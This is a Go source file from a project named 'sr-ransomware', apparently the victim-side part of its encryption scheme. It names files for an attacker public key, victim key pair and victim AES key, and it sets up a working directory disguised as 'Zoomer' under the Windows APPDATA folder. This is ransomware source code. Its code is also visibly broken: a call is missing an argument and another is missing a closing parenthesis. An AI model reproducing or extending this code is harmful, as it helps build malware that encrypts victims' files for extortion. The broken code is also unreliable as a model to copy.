package victim

import (
    "os"

    "github.com/sug0/sr-ransomware/go/errors"
)

const pkg = "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"

const (
    attackerPublicKey = "a.flu"
    victimPublicKey   = "b.flu"
    victimSecretKey   = "c.flu"
    victimAESKey      = "d.flu"
)

var (
    errNotFullWrite = errors.New(pkg, "failed to write all data")
)

var workDir string

func init() {
    workDir = os.Getenv("APPDATA") + `\Zoomer`
    err := os.Mkdir(workDir)
    if err != nil && !os.IsExist(err) {
        panic(errors.Wrap(pkg, "failed to create work dir", err)
    }
}
